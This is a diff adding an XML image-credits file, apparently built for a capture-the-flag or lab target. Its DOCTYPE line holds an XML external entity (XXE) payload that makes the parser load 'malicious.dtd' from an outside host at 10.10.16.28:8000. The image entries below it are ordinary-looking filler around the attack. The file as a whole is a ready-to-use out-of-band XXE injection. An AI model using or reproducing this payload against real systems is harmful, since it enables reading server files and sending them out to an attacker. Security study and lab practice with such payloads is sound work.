@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.28:8000/malicious.dtd"> %xxe;]>
+<credits>
+  <author>author</author>
+  <image>
+    <uri>/img/greg.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/hungy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smooch.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/smiley.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
